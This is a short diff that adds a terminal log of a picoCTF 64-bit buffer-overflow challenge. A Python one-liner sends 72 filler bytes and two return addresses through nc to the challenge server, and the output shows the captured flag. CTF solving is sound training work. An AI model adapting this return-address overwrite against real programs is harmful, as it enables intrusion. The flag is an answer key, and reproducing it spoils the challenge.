@@ -1,0 +1,4 @@
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xd2\x12\x40\x00\x00\x00\x00\x00' + b'\x36\x12\x40\x00\x00\x00\x00\x00' + b'\n\n')" -| nc saturn.picoctf.net 59703
+Welcome to 64-bit. Give me a string that gets you the flag:
+Welcome to 64-bit. Give me a string that gets you the flag:
+picoCTF{b1663r_15_b3773r_11c407bc}
